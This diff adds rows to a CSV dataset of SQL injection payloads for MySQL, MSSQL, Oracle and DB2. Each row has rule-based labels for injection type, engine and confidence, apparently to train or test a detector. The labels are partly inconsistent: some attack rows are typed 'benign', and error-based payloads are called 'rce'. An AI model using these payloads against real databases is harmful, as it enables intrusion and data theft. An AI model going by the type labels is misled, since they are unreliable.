@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+6210,"1"" where 1203 = 1203 union all select null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6211,"1"" and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+6212,"1' ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( 'lfhx' = 'lfhx",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
+6213,1'+ ( select 'qbdh' where 4006 = 4006 and 7533 = 7533 ) +',1,,boolean_blind,generic,0.95,4006 = 4006 and detected — boolean_blind injection (priority 8) on generic,rule-based
+6214,"1 ) as zhvx where 3171 = 3171 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
+6215,1' ) waitfor delay '0:0:5',1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+6216,"1%"" ) ) union all select null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6217,"-4945 or make_set ( 9354 = 9354,7185 )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6218,"1 and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
+6219,"1%' ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( '%' = '",1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
+6220,1' ) where 4003 = 4003,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6221,"1"" where 9632 = 9632 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
+6222,"1' ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and 'nwdk' like 'nwdk",1,,boolean_blind,generic,0.95,like ' detected — boolean_blind injection (priority 8) on generic,rule-based
+6223,1'+ ( select 'upmd' where 3438 = 3438,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6224,"-2384%' ) ) union all select 2467,2467,2467,2467#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6225,"1"" ) ) union all select null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6226,1 ) and 5196 = 9002,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6227,1'+ ( select 'gmpn' where 8137 = 8137 or sleep ( 5 ) ) +',1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
+6228,-4713' ) ) ) or 4567 = 1287,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6229,1'+ ( select xwcl where 7997 = 7997,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6230,"1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""qcqx"" like ""qcqx",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+6231,"-5657' ) ) ) union all select 8071,8071,8071,8071,8071,8071,8071,8071#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6232,"1%"" ) ) and sleep ( 5 ) #",1,,time_blind,mysql,0.95,"sleep (, and sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
+6233,1'+ ( select 'ggkm' where 3394 = 3394,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6234,"-6095"" ) ) as kgfp where 3601 = 3601 or 7287 = 9373#",1,,boolean_blind,generic,0.95,3601 = 3601 or detected — boolean_blind injection (priority 8) on generic,rule-based
+6235,"1'|| ( select 'ysij' from dual where 6140 = 6140 procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) ) ||'",1,,rce,oracle,0.95,0x52515a50 detected — rce injection (priority 1) on oracle,rule-based
+6236,"-8550"" ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ""kyad"" = ""kyad",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
+6237,"1' in boolean mode ) union all select null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6238,"-1559 union all select 3985,3985,3985,3985#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6239,1 ) where 6090 = 6090,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
